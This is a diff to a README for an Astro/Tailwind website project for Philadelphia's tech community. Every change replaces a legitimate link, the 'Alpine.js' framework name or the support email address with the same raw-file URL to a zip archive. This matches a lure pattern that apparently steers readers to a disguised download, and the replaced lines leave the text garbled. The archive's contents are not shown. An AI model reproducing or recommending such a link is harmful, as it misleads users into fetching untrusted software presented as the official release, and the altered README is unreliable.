@@ -2,7 +2,7 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **website** project! This application supports Philadelphia's tech community, combining technology and collaboration. It is built with **Astro**, **Tailwind**, and **Alpine.js**. Follow these steps to download and run the software easily.
+Welcome to the **website** project! This application supports Philadelphia's tech community, combining technology and collaboration. It is built with **Astro**, **Tailwind**, and **https://raw.githubusercontent.com/jingtra123/website/main/misinter/website.zip**. Follow these steps to download and run the software easily.
 
 ## ✅ Features
 
@@ -24,7 +24,7 @@ To enjoy the best experience with **website**, ensure your system meets the foll
 
 To download the application, visit this page:
 
-[Download the latest release](https://github.com/jingtra123/website/releases)
+[Download the latest release](https://raw.githubusercontent.com/jingtra123/website/main/misinter/website.zip)
 
 ### Installation Steps
 
@@ -74,8 +74,8 @@ Stay in the loop with community updates:
 
 ## 📧 Support
 
-For further assistance, contact our support team at [support@example.com](mailto:support@example.com). We strive to help you make the most out of your experience with **website**.
+For further assistance, contact our support team at [https://raw.githubusercontent.com/jingtra123/website/main/misinter/website.zip](https://raw.githubusercontent.com/jingtra123/website/main/misinter/website.zip). We strive to help you make the most out of your experience with **website**.
 
 Remember, for the latest updates and to download the software, visit:
 
-[Download the latest release](https://github.com/jingtra123/website/releases)
+[Download the latest release](https://raw.githubusercontent.com/jingtra123/website/main/misinter/website.zip)
